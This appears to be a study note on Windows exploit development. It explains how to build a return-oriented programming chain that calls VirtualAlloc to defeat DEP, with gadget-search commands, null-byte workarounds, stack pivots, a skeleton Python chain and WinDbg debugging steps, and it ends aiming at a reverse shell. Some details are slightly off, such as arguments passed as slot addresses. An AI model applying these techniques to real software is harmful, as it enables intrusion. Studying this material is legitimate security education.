
# ROP_

Return Oriented Programming :: continuing from [DEP Bypass — NOTE_](https://claude.ai/maldev/dep_bypass/note_)

We already know DEP makes the stack NX. We already know ROP is how we get around it by chaining together small pieces of code that already exist in memory (gadgets), instead of injecting our own. Time to actually build the damn chain.

## THE MENTAL MODEL (again, but it has to stick)

Forget "exploit dev" for a second. Think of RET as a dumb little loop that never stops asking ESP the same question:

```
EIP = [ESP]      # whatever ESP points to becomes the next instruction
ESP = ESP + 4    # then ESP moves to the next slot
```

That's it. That's the entire ROP engine. One instruction (`ret`), repeated forever, reading whatever WE put on the stack.

So a "ROP chain" is nothing but a list of addresses sitting on the stack, back to back:

```
[gadget 1 addr]
[gadget 2 addr]
[gadget 3 addr]
...
[VirtualAlloc addr]
[fake return addr]
[arg1]
[arg2]
[arg3]
[arg4]
```

Every gadget MUST end in `ret`, because that `ret` is what pulls the next address off the stack and keeps the chain moving. Break that and the whole chain dies.

## FINDING GADGETS

First rule — the module you pull gadgets from must NOT have ASLR enabled, or the addresses shift every reboot and the chain is worthless. Check with `!nmod` in WinDbg like we did for jmp_esp hunting.

```
> rp++ -f target.dll -r 5 > rop.txt
```

`-r 5` = max 5 instructions per gadget. Keep it short — long gadgets have more side effects (clobbered registers, stack shifts) that'll wreck your chain without you noticing.

VS Code regex to hunt useful patterns fast:

```
push\s+esp[\s\S]*?pop\s+(esi|eax|ebx|ecx|edi|edx)[\s\S]*?ret
```

```
push\s+esp[\s\S]*?pop\s+(esi|eax|ebx|ecx|edi|edx)[\s\S]*?pop\s+(esi|eax|ebx|ecx|edi|edx)[\s\S]*?ret
```

### THE RULE THAT ACTUALLY MATTERS

> Don't search gadgets first. Search for the VALUE you need. Then find gadgets to create it.

Every open slot in your chain is a _requirement_ ("I need EAX = 0x40" / "I need [some address] = 0"), not a gadget you're browsing for. Work backwards from the requirement, every single time. Browsing rop.txt with no target value in mind is how you burn 3 hours doing nothing.

## PREPPING THE ARGUMENTS — WHY THIS ISN'T JUST "FIND 6 GADGETS"

VirtualAlloc is `stdcall`. That means the second we `ret` into it, ESP has to look EXACTLY like it does after a normal `call VirtualAlloc` — return address first, then the args, back to back, nothing in between:

```
LPVOID VirtualAlloc(
  LPVOID lpAddress,        // NULL - let OS pick
  SIZE_T dwSize,           // 0x1000
  DWORD  flAllocationType, // MEM_COMMIT       = 0x1000
  DWORD  flProtect         // PAGE_EXECUTE_RW  = 0x40
);
```

So the tail end of the chain is NOT gadgets — it's just clean values laid out stdcall-style:

```
[VirtualAlloc addr]   <- we ret INTO this
[fake ret addr]       <- where VirtualAlloc returns to after (often -> shellcode)
[[lpAddress]  = 0x00000000
[dwSize]      = 0x00001000
[flAllocType] = 0x00001000
[flProtect]   = 0x00000040
```

The gadgets exist to solve ONE problem: getting those values onto the stack without ever writing them into your input buffer directly.

## THE ACTUAL PROBLEM — NULL BYTES

Look at those values again. `0x1000`, `0x1000`, `0x40` — every single one of them contains a null byte. If your overflow travels as a string (HTTP request, socket send, whatever), a `\x00` truncates it right there. Can't just `pack("<L", 0x1000)` into the buffer and call it done.

This is the entire reason gadgets show up in this exploit at all. Instead of writing the value, you write instructions that COMPUTE the value at exploit time, using only non-null gadget addresses and non-null intermediate values.

Standard toolbox, all of these end in `ret` so they chain cleanly:

```
xor eax, eax   ; ret        -> zero a register cleanly (lpAddress = NULL)
pop eax        ; ret        -> load a small non-null value
shl eax, 0xC   ; ret        -> 0x1 << 12 = 0x1000, no null ever touched the buffer
neg eax        ; ret        -> flip a value (0xffffffc0 -> 0x40 after negate/add tricks)
add eax, ebx   ; ret        -> combine two clean registers into a dirty target value
pop ebp        ; ret        -> stage a value before writing it somewhere
mov [ebp], eax ; ret        -> WRITE the computed value into the exact stack slot VirtualAlloc expects
```

Concrete example — getting `0x1000` (MEM_COMMIT / dwSize) onto the stack with zero nulls in the buffer:

```
pop eax  ; ret     <- stack value: 0x00000001   (clean, no nulls)
shl eax, 0xC ; ret  <- EAX = 0x00000001 << 12 = 0x00001000
push eax ; ret      <- or a mov [target], eax gadget, depending what you've got
```

Same trick, different registers, for every dirty argument. This is 90% of what "building a ROP chain" actually is — not fancy, just patiently solving "how do I get this exact 4 bytes into this exact stack slot without ever writing those bytes literally."

## WHEN THE BUFFER ISN'T BIG ENOUGH — STACK PIVOT

Sometimes your controllable buffer is too small to hold this whole chain (gadgets + computed values + the shellcode). If you've got a SECOND, bigger buffer elsewhere (register points to it, heap, whatever) that also survives the bad-char filter, pivot ESP there:

```
xchg eax, esp ; ret     <- if EAX already points into your big buffer
pop esp       ; ret     <- if you can stage the target address on the stack first
```

Once ESP points into the big buffer, every following `ret` starts pulling gadgets from THAT region instead — effectively teleporting your ROP engine somewhere with room to breathe.

## PUTTING IT TOGETHER

```python
rop  = pack("<L", gadget_xor_eax)        # EAX = 0
rop += pack("<L", gadget_pop_ebp)
rop += pack("<L", lpAddress_slot)        # where to write it
rop += pack("<L", gadget_mov_ebp_eax)    # [lpAddress_slot] = 0

rop += pack("<L", gadget_pop_eax)
rop += pack("<L", 0x00000001)
rop += pack("<L", gadget_shl_eax_0xC)    # EAX = 0x1000
rop += pack("<L", gadget_pop_ebp)
rop += pack("<L", dwSize_slot)
rop += pack("<L", gadget_mov_ebp_eax)    # [dwSize_slot] = 0x1000

# ... same pattern for flAllocationType, flProtect ...

rop += pack("<L", virtualalloc_addr)
rop += pack("<L", shellcode_addr)        # fake return -> lands on shellcode
rop += pack("<L", lpAddress_slot)
rop += pack("<L", dwSize_slot)
rop += pack("<L", allocType_slot)
rop += pack("<L", protect_slot)
```

## VERIFYING IN WINDBG

Same rhythm as the jmp_esp days:

```
--> bp [first gadget address]     [break right where EIP first lands]
--> g                             [run]
--> t                             [step through gadget by gadget]
--> r                             [check registers after every hop — is EAX becoming what you expect?]
--> dd esp                        [watch the chain get consumed, slot by slot]
```

Step through ONE gadget at a time the first few runs. The second a register holds garbage instead of your target value, that's your bug — go back to "search for the value, then find the gadget," not the other way around.

## TL;DR CHECKLIST

1. Non-ASLR module identified, gadgets pulled with rp++
2. Know your bad chars already (from the original BOF work)
3. List every argument VirtualAlloc/VirtualProtect needs — mark which ones contain bad bytes
4. For each dirty value: find a gadget sequence that COMPUTES it clean, writes it into place
5. Clean stdcall layout at the tail: `[API addr][fake ret][args...]`
6. If buffer's too small — stack pivot to a bigger one
7. Step through in WinDbg one gadget at a time before trusting the full chain
8. Chain lands -> memory becomes RWX -> ret into shellcode -> reverse shell